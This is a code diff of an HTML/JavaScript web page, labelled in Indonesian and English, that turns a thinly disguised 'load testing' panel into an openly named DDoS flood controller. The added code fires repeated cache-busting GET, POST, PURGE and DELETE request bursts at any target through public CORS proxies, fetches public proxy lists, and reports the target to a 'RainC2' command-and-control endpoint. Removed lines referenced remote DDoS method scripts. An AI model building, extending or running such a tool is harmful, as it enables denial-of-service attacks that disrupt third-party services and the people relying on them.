@@ -28,8 +28,8 @@
 
 <div class="container">
     <header style="text-align: center; margin-bottom: 30px;">
-        <h1>🛡 Ddos Attack</h1>
-        <p style="color: #a1a1aa;">Sistem Pemantauan Performa dan Pengujian Beban Terdistribusi</p>
+        <h1>🛡 DDOS ATTACK v3</h1>
+        <p style="color: #a1a1aa;">Advanced Multi-Method Flood Controller</p>
     </header>
 
     <div class="section">
@@ -42,14 +42,24 @@
             <label>Target Endpoint (URL/IP)</label>
             <input type="text" id="target" placeholder="https://target-infrastruktur-anda.com">
         </div>
-        <div style="display: grid; grid-template-columns: 1fr 1fr 1fr; gap: 15px;">
-            <div>
+                <div style="display: flex; justify-content: space-between; align-items: center;">
+            <div style="margin-right:5px">
                 <label>Threads</label>
-                <input type="number" id="threads" value="10" min="1">
+                <input type="number" id="threads" value="50" min="1">
             </div>
             <div>
                 <label>Durasi (Detik)</label>
                 <input type="number" id="time" value="60">
+            </div>
+            </div>
+            <div>
+                <label>HTTP Method</label>
+                <select id="http-method">
+                    <option value="GET">GET</option>
+                    <option value="POST">POST</option>
+                    <option value="PURGE">PURGE</option>
+                    <option value="DELETE">DELETE</option>
+                </select>
             </div>
             <div>
                 <label>Proxy Type</label>
@@ -60,7 +70,6 @@
                     <option value="pubproxy">Public Proxy List</option>
                 </select>
             </div>
-        </div>
         
         <label>Pilih Metode Analisis:</label>
         <select id="method">
@@ -68,7 +77,7 @@
         </select>
         
         <div class="btn-group">
-            <button id="run-btn" class="btn-run" onclick="startExecution()">MULAI PENGUJIAN BEBAN</button>
+            <button id="run-btn" class="btn-run" onclick="startExecution()">MULAI ATTACK FLOODER</button>
             <button id="stop-btn" class="btn-stop" onclick="stopExecution()">HENTIKAN PENGUJIAN</button>
         </div>
     </div>
@@ -76,7 +85,7 @@
     <div class="log-container">
         <div class="status-bar">
             <span>Status: <b id="system-status">IDLE</b></span>
-            <span>Threads: <b id="active-threads">0</b></span>
+            <span>Requests Sent: <b id="request-count">0</b></span>
             <span>Proxies: <b id="proxy-count">0</b></span>
         </div>
         <div id="log" class="log-box"></div>
@@ -88,6 +97,8 @@
     const runBtn = document.getElementById('run-btn');
     const stopBtn = document.getElementById('stop-btn');
     let executionTimer = null;
+    let floodInterval = null;
+    let totalSent = 0;
     const workerProxies = [
         "https://corsproxy.io/?key=8a51f9c2&url=",
         "https://api.allorigins.win/raw?url=",
@@ -106,118 +117,104 @@
     }
 
     async function fetchProxies(type) {
-        addLog(`Fetching ${type} proxies via workers...`, "info");
-        const proxyUrl = workerProxies[Math.floor(Math.random() * workerProxies.length)];
+        addLog(`Fetching ${type} proxies...`, "info");
+        const proxyWorker = workerProxies[Math.floor(Math.random() * workerProxies.length)];
         let targetHabib;
-
         if (type === "pubproxy") targetHabib = 'https://raw.githubusercontent.com/proxifly/free-proxy-list/main/proxies/all/data.txt';
         else if (type === "socks4") targetHabib = 'https://raw.githubusercontent.com/officialputuid/KangProxy/refs/heads/KangProxy/socks4/socks4.txt';
         else if (type === "socks5") targetHabib = 'https://raw.githubusercontent.com/TheSpeedX/PROXY-List/refs/heads/master/socks5.txt';
         else targetHabib = `https://api.proxyscrape.com/v2/?request=displayproxies&protocol=${type}&timeout=10000&country=all&ssl=all&anonymity=all`;
-
-        let finalUrl = proxyUrl + encodeURIComponent(targetHabib);
-        if (proxyUrl.includes("corsfix.com")) {
-            const separator = finalUrl.includes('?') ? '&' : '?';
-            finalUrl += `${separator}apiKey=${encodeURIComponent(SECRET_NAME)}`;
+        let finalUrl = proxyWorker + encodeURIComponent(targetHabib);
+        if (proxyWorker.includes("corsfix.com")) {
+            finalUrl += `&apiKey=${encodeURIComponent(SECRET_NAME)}`;
         }
-
         try {
             const res = await fetch(finalUrl);
             const text = await res.text();
             const list = text.split('\n').filter(p => p.trim() !== "");
             document.getElementById('proxy-count').innerText = list.length;
-            addLog(`Successfully loaded ${list.length} proxies via ${new URL(proxyUrl).hostname}`, "success");
+            addLog(`Loaded ${list.length} proxies.`, "success");
             return list;
         } catch (err) {
-            addLog(`Failed to fetch via worker: ${err.message}`, "error");
+            addLog("Failed to fetch proxies.", "error");
             return [];
+        }
+    }
+
+    async function runDirectFlood(target, threads, httpMethod) {
+        for (let i = 0; i < threads; i++) {
+            const bypassUrl = target + (target.includes('?') ? '&' : '?') + 'cache=' + Math.random();
+            const worker = workerProxies[Math.floor(Math.random() * workerProxies.length)];
+            let finalUrl = worker + encodeURIComponent(bypassUrl);
+            
+            const options = {
+                method: httpMethod,
+                mode: 'no-cors',
+                cache: 'no-cache',
+                referrerPolicy: 'no-referrer'
+            };
+            
+            if (httpMethod === "POST") {
+                options.body = JSON.stringify({ data: Math.random().toString(36) });
+            }
+
+            fetch(finalUrl, options).then(() => {
+                totalSent++;
+                document.getElementById('request-count').innerText = totalSent;
+            }).catch(() => {});
         }
     }
 
     async function startExecution(isResume = false) {
         const target = document.getElementById('target').value;
         const method = document.getElementById('method').value;
+        const httpMethod = document.getElementById('http-method').value;
         const time = document.getElementById('time').value;
         const threads = document.getElementById('threads').value;
         const proxyType = document.getElementById('proxy-type').value;
 
-        if (!target) return addLog("Tentukan target terlebih dahulu!", "warn");
+        if (!target) return addLog("Target diperlukan!", "warn");
 
+        totalSent = 0;
         const proxyList = await fetchProxies(proxyType);
 
-        if (method === "habibGMr9" && !isResume) {
-            const subMethods = ['https://raw.githubusercontent.com/GMhabib/DDOSAPi/refs/heads/main/methods/high-dstat.js', 'https://raw.githubusercontent.com/GMhabib/DDOSAPi/refs/heads/main/methods/w-flood1.js', 'https://raw.githubusercontent.com/GMhabib/DDOSAPi/refs/heads/main/methods/vhold.js', 'https://raw.githubusercontent.com/GMhabib/DDOSAPi/refs/heads/main/methods/nust.js', 'https://raw.githubusercontent.com/GMhabib/DDOSAPi/refs/heads/main/methods/bypass.js'];
-            addLog("Initializing modules...", "info");
-            for (const path of subMethods) {
-                try {
-                    const res = await fetch(path);
-                    if (res.ok) addLog(`✓ Module: ${path}`, "success");
-                    else addLog(`! Missing: ${path}`, "error");
-                } catch (e) { addLog(`✗ Error: ${path}`, "error"); }
-            }
-        }
-
         document.getElementById('system-status').innerText = "RUNNING";
-        document.getElementById('active-threads').innerText = threads;
         runBtn.style.display = 'none';
         stopBtn.style.display = 'block';
 
-        if(!isResume) {
-            const expiry = Date.now() + (parseInt(time) * 1000);
-            localStorage.setItem('active_test', JSON.stringify({ target, method, time, threads, proxyType, expiry }));
-            addLog(`Starting <span class="method-tag">${method}</span> -> ${target} [Threads: ${threads}]`);
-        }
+        addLog(`Flooding ${target} with ${httpMethod} [Threads: ${threads}]`, "success");
+
+        floodInterval = setInterval(() => {
+            runDirectFlood(target, threads, httpMethod);
+        }, 150);
 
         try {
             await fetch('/api/RainC2', {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ target, method, time, threads, proxyType, proxies: proxyList })
+                body: JSON.stringify({ target, method, time, threads, proxyType, proxies: proxyList, httpMethod })
             });
-            addLog("Signal sent to cluster.", "success");
-        } catch (err) {
-            addLog("API Connection Failed.", "error");
-        }
+        } catch (err) {}
 
-        const remainingTime = isResume ? (JSON.parse(localStorage.getItem('active_test')).expiry - Date.now()) : (time * 1000);
-        clearTimeout(executionTimer);
-        executionTimer = setTimeout(() => stopExecution(true), remainingTime);
+        executionTimer = setTimeout(() => {
+            stopExecution(true);
+        }, time * 1000);
     }
 
     function stopExecution(auto = false) {
-        localStorage.removeItem('active_test');
+        clearInterval(floodInterval);
         clearTimeout(executionTimer);
         document.getElementById('system-status').innerText = "IDLE";
-        document.getElementById('active-threads').innerText = "0";
-        document.getElementById('proxy-count').innerText = "0";
         runBtn.style.display = 'block';
         stopBtn.style.display = 'none';
-        if(auto) addLog("Finished.", "success");
-        else addLog("Stopped manually.", "error");
-    }
-
-    function checkPersistence() {
-        const savedTest = localStorage.getItem('active_test');
-        if (savedTest) {
-            const data = JSON.parse(savedTest);
-            if (Date.now() < data.expiry) {
-                document.getElementById('target').value = data.target;
-                document.getElementById('method').value = data.method;
-                document.getElementById('time').value = data.time;
-                document.getElementById('threads').value = data.threads;
-                document.getElementById('proxy-type').value = data.proxyType;
-                startExecution(true);
-            } else { localStorage.removeItem('active_test'); }
-        }
+        addLog(auto ? "Flooding selesai." : "Flooding dihentikan.", auto ? "success" : "error");
     }
 
     function clearLogs() {
         logBox.innerHTML = "";
-        addLog("Logs cleared.");
+        totalSent = 0;
+        document.getElementById('request-count').innerText = "0";
     }
-
-    window.onload = checkPersistence;
 </script>
-
 </body>
 </html>
